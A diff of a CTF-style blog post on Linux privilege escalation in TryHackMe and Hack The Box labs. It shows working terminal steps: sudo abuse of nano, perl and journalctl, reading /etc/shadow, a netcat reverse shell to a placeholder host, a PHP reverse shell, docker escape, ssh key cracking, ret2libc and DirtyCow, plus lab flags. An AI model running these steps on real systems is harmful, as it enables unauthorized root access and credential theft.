@@ -1,37 +1,37 @@
 ---
 title: Linux privilage escalation techniques
 author: fieldraccoon
-date: 2020-06-28 
+date: 2020-06-28
 categories: [examples, linux-privelage-escalation]
 tags: [hack-the-box, tryhackme,]
 math: true
 ---
 
 
-## SUID binaries found with `sudo -l` for privilege escalation:
+# SUID binaries found with `sudo -l` for privilege escalation:
 
 
-### tryhackme linux priv esc arena:
+## tryhackme linux priv esc arena:
 
 
 Running `sudo -l` returns a few options of things we can run so we will find a way to exploit each one:
 ```bash
 TCM@debian:~$ sudo -l
 Matching Defaults entries for TCM on this host:
-    env_reset, env_keep+=LD_PRELOAD
+		env_reset, env_keep+=LD_PRELOAD
 
 User TCM may run the following commands on this host:
-    (root) NOPASSWD: /usr/sbin/iftop
-    (root) NOPASSWD: /usr/bin/find
-    (root) NOPASSWD: /usr/bin/nano
-    (root) NOPASSWD: /usr/bin/vim
-    (root) NOPASSWD: /usr/bin/man
-    (root) NOPASSWD: /usr/bin/awk
-    (root) NOPASSWD: /usr/bin/less
-    (root) NOPASSWD: /usr/bin/ftp
-    (root) NOPASSWD: /usr/bin/nmap
-    (root) NOPASSWD: /usr/sbin/apache2
-    (root) NOPASSWD: /bin/more
+		(root) NOPASSWD: /usr/sbin/iftop
+		(root) NOPASSWD: /usr/bin/find
+		(root) NOPASSWD: /usr/bin/nano
+		(root) NOPASSWD: /usr/bin/vim
+		(root) NOPASSWD: /usr/bin/man
+		(root) NOPASSWD: /usr/bin/awk
+		(root) NOPASSWD: /usr/bin/less
+		(root) NOPASSWD: /usr/bin/ftp
+		(root) NOPASSWD: /usr/bin/nmap
+		(root) NOPASSWD: /usr/sbin/apache2
+		(root) NOPASSWD: /bin/more
 
 ```
 #### Exploiting file as sudo:
@@ -64,7 +64,7 @@ root
 ```
 #### Exploiting apache2 as sudo:
 ```bash
-TCM@debian:~$ sudo apache2 -f /etc/shadow                                                                                                                            
+TCM@debian:~$ sudo apache2 -f /etc/shadow
 Syntax error on line 1 of /etc/shadow:
 Invalid command 'root:$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0:17298:0:99999:7:::'
 ```
@@ -124,22 +124,22 @@ bash-4.1# whoami
 root
 ```
 
-### tryhackme pentest box, the most simlpe priv esc with `sudo -l` to show us we can run anything as root so we can simply su.
+## tryhackme pentest box, the most simlpe priv esc with `sudo -l` to show us we can run anything as root so we can simply su.
 
 ```bash
 kay@basic2:~$ sudo -l
-[sudo] password for kay: 
+[sudo] password for kay:
 Matching Defaults entries for kay on basic2:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User kay may run the following commands on basic2:
-    (ALL : ALL) ALL
+		(ALL : ALL) ALL
 kay@basic2:~$ sudo su root
 root@basic2:/home/kay# whoami
 root
 ```
 
-### openadmin htb - using nano to get a shell:
+## openadmin htb - using nano to get a shell:
 
  ROOT
 
@@ -147,10 +147,10 @@ We run `sudo -l` as always when we are trying to priv esc to see if we can run a
 ```bash
 joanna@openadmin:~$ sudo -l
 Matching Defaults entries for joanna on openadmin:
-    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User joanna may run the following commands on openadmin:
-    (ALL) NOPASSWD: /bin/nano /opt/priv
+		(ALL) NOPASSWD: /bin/nano /opt/priv
 ```
 
 In fact we can run something, we can use the text editor nano as root on teh file /opt/priv
@@ -168,7 +168,7 @@ There are two ways of doing it from here.
 2. Or we can get a shell by doing the above command involving `reset`.
 
 ```bash
-Command to execute: reset; sh 1>&0 2>&0# ls                                                                                                                                                                                                
+Command to execute: reset; sh 1>&0 2>&0# ls
 user.txte                                                                                                          ^X Read File
 # cd /root
 # ls
@@ -180,17 +180,17 @@ root.txt: not found
 ```
 
 
-### tryhackme lazy-admin box - sudo -l - perl priv-esc
+## tryhackme lazy-admin box - sudo -l - perl priv-esc
 
 ```bash
 www-data@THM-Chal:/home/itguy$ sudo -l
 sudo -l
 Matching Defaults entries for www-data on THM-Chal:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+		env_reset, mail_badpass,
+		secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on THM-Chal:
-    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+		(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
 ```
 
 After checking the file `backup.pl` we can see that it is running this:
@@ -206,7 +206,7 @@ We add a reverse shell to the file and execute it as root and we get a shell.
 
 ```bash
 www-data@THM-Chal:/home/itguy$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh
-< -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh                         
+< -i 2>&1|nc xx.xx.xx.xx 1234 >/tmp/f" > /etc/copy.sh
 www-data@THM-Chal:/home/itguy$ sudo /usr/bin/perl /home/itguy/backup.pl
 sudo /usr/bin/perl /home/itguy/backup.pl
 ```
@@ -223,9 +223,81 @@ uid=0(root) gid=0(root) groups=0(root)
 # cat root.txt
 THM{6637f41d0177b6f37cb20d775124699f}
 ```
+## tryhackme linux privlege escalation arena()80 different SUID binaries(80 different priv esc methods):
+
+## priv esc with journalctl -  hack the box traverxec root:
+
+We find an interesting file in `bin` called `server-stats.sh` so we run it to see what its doing.
+
+```#!/usr/bin/env bash
+
+#!/usr/bin/env bash
+david@traverxec:~/bin$ bash server-stats.sh
+                                                                          .----.
+                                                              .---------. | == |
+   Webserver Statistics and Data                              |.-"""""-.| |----|
+         Collection Script                                    ||       || | == |
+          (c) David, 2019                                     ||       || |----|
+                                                              |'-.....-'| |::::|
+                                                              '"")---(""' |___.|
+                                                             /:::::::::::\"    "
+                                                            /:::=======:::\
+                                                        jgs '"""""""""""""'
+
+Load:  00:38:38 up 1 day,  5:31,  2 users,  load average: 0.00, 0.00, 0.00
+
+Open nhttpd sockets: 3
+Files in the docroot: 117
+
+Last 5 journal log lines:
+-- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 00:38:38 EDT. --
+Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=www-data
+Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
+Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
+Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
+```
+we can see that it is outputting some kind of logs so we take a look at the file to see exactly what its doing.
+```#!/usr/bin/env bash
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+```
+We can see on the top line that it is reading the head for `server-stats` which is the ascii art and the copyright.
+
+But at the bottom is the part that is running as root(sudo)
+```#!/usr/bin/env bash
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+```
+This tells us that we can run `journalctl` as root.
+
+We can do a quick search on gtfobins which tells us that we can use it to execute a shell if our window is minimal.
+```#!/usr/bin/env bash
+avid@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Thu 2020-04-09 19:07:20 EDT, end at Sat 2020-04-11 01:14:31 EDT. --
+Apr 10 23:47:54 traverxec sudo[4133]: pam_unix(sudo:auth): authentication failure; logname= uid=33 euid=0 tty=/dev/pts/7 ruser=www-data rhost=  user=w
+Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): conversation failed
+Apr 10 23:47:56 traverxec sudo[4133]: pam_unix(sudo:auth): auth could not identify password for [www-data]
+Apr 10 23:47:56 traverxec sudo[4133]: www-data : command not allowed ; TTY=pts/7 ; PWD=/tmp ; USER=root ; COMMAND=list
+Apr 10 23:47:56 traverxec crontab[4194]: (www-data) LIST (www-data)
+!/bin/bash
+root@traverxec:/home/david#
+```
+After the script has executed we type `!/bin/bash` which will give us a shell.
+
+Overall this wasnt the greatest way to do this as without gtfobins it required pure guesswork as the shell wouldnt work if the window wasnt minmised.
+
+
 ## Other
 
-### Priv esc with mounting file system on docker:
+## Priv esc with mounting file system on docker:
 
 Running `id` confirms that the user is part of a docker group, we will see if we can exploit this.
 ```bash
@@ -258,7 +330,7 @@ bash-4.4# cat root.txt
 bash-4.4#
 ```
 
-### priv esc with ssh-key cracking - tryhackme box
+## priv esc with ssh-key cracking - tryhackme box
 
 in this model priv esc we gain access to a user who can read other users ssh private keys but they are encrypted with a password. We crack the key with ssh2john and ssh into that user with the password it cracks.
 
@@ -339,12 +411,13 @@ e5ofsDLuIOhCVzsw/DIUrF+4liQ3R36Bu2R5+kmPFIkkeW1tYWIY7CpfoJSd74VC
 ```
 From here we have the private ssh key. We transfer this to our box and run ssh2john followed by john to get our password. We then just simply ssh as the user
 and use the password that we cracked.
+
 ```bash
 
 kali@kali:~/tryhackme$ nano id_rs
 kali@kali:~/tryhackme$ chmod 400 id_rs
 kali@kali:~/tryhackme$ ssh kay@10.10.61.236
-kay@10.10.61.236's password: 
+kay@10.10.61.236's password:
 
 [3]+  Stopped                 ssh kay@10.10.61.236 <--- this shows us that the key needs a password
 
@@ -366,16 +439,16 @@ beeswax          (id_rs)
 ^Z
 [4]+  Stopped                 sudo john -w=/home/kali/rockyou.txt hash
 kali@kali:~/tryhackme$ ssh kay@10.10.61.236
-kay@10.10.61.236's password: 
+kay@10.10.61.236's password:
 Permission denied, please try again.
-kay@10.10.61.236's password: 
-                                                                                                                                   
-[5]+  Stopped                 ssh kay@10.10.61.236                                                                                 
+kay@10.10.61.236's password:
+
+[5]+  Stopped                 ssh kay@10.10.61.236
 kali@kali:~/tryhackme$ ssh -i id_rs kay@10.10.61.236
-load pubkey "id_rs": invalid format                                                                                                
-Enter passphrase for key 'id_rs':                                                                                                  
-Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)                                                                 
-                                                                                                                                   
+load pubkey "id_rs": invalid format
+Enter passphrase for key 'id_rs':
+Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
+
  * Documentation:  https://help.ubuntu.com
  * Management:     https://landscape.canonical.com
  * Support:        https://ubuntu.com/advantage
@@ -400,10 +473,10 @@ Date:   Mon Mar 19 09:33:06 2018 -0400
 ```
 This means that the user had an old ssh key reverted(its the root ssh key) so we need to try and find a way to get this. We run `git show 33e87c312c08735a02fa9c796021a4a3023129ad `and it shows us the root key, We copy it to our box once again, give it appropriate permissions and ssh as root.
 
-### simple ret2libc exploit to get a root shell
+## simple ret2libc exploit to get a root shell
 
 We find an SUID binary in /home/ayush/.binary, its called rop
-we run it to see what it does, basically it just takes our input and outputs it. 
+we run it to see what it does, basically it just takes our input and outputs it.
 We do:
 ```bash
 ./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -412,8 +485,9 @@ And we see that it returns a seg fault so we have a buffer overflow vulnerabilit
 We are going to do a ret2libc attack.
 GDB is not installed on the box so we download a static version and then upload it via a metpreter session.
 Theses are the exploitation steps:
+
 ```bash
-on our box: 
+on our box:
 gdb-peda$ pattern_create -l 100
 'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
 gdb rop
@@ -427,14 +501,14 @@ we will get an offset of 52
 This shows us that the buffer overflows at 52 chars
 Now we need to get all the addresses so we will start with finding the /bin/sh in libc
 ```bash
-www-data@frolic:/home/ayush/.binary$ ldd rop 
-        linux-gate.so.1 =>  (0xb7fda000)
-        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)    
-        /lib/ld-linux.so.2 (0xb7fdb000)
-        
+www-data@frolic:/home/ayush/.binary$ ldd rop
+				linux-gate.so.1 =>  (0xb7fda000)
+				libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)
+				/lib/ld-linux.so.2 (0xb7fdb000)
+
 www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
  15ba0b /bin/sh
-Also in gdb we do "p system" and "p exit" to find the addresses for system and exit 
+Also in gdb we do "p system" and "p exit" to find the addresses for system and exit
  ```
 So now we have all our addresses:
 ```python
@@ -461,7 +535,7 @@ Then we simply run This command to exploit the binary and get a root shell and r
 ./rop `python /tmp/exploit.py`
 ```
 
-### root shell via php file execution as root - htb cronos:
+## root shell via php file execution as root - htb cronos:
 
 By running linenum.sh on the system we find an interesting file on it called `/etc/crontab`.
 
@@ -504,7 +578,7 @@ HTTP request sent, awaiting response... 200 OK
 Length: 5492 (5.4K) [application/octet-stream]
 Saving to: 'php-reverse-shell.php'
 
-php-reverse-shell.p 100%[===================>]   5.36K  --.-KB/s    in 0.003s  
+php-reverse-shell.p 100%[===================>]   5.36K  --.-KB/s    in 0.003s
 
 2020-06-27 12:15:48 (1.63 MB/s) - 'php-reverse-shell.php' saved [5492/5492]
 
@@ -532,18 +606,18 @@ root
 1703b8a3c9a8dde879942c79d02fd3a0
 ```
 
-### Using dirtycow
+## Using dirtycow
 
 we can test to see if the kernel for that machine is vulnrable by running an exploit suggestor and if it comes up with dirty cow we can abuse it like this:
 ```bash
 TCM@debian:~$ ./c0w
-                                
-   (___)                                   
-   (o o)_____/                             
-    @@ `     \                            
-     \ ____, //usr/bin/passwd                          
-     //    //                              
-    ^^    ^^                               
+
+	 (___)
+	 (o o)_____/
+		@@ `     \
+		 \ ____, //usr/bin/passwd
+		 //    //
+		^^    ^^
 DirtyCow root privilege escalation
 Backing up /usr/bin/passwd to /tmp/bak
 mmap 9ca4000
@@ -561,5 +635,4 @@ root@debian:/home/user# id && whoami
 uid=0(root) gid=1000(user) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(user)
 root
 ```
-
 Thanks for reading hope that you enjoyed.
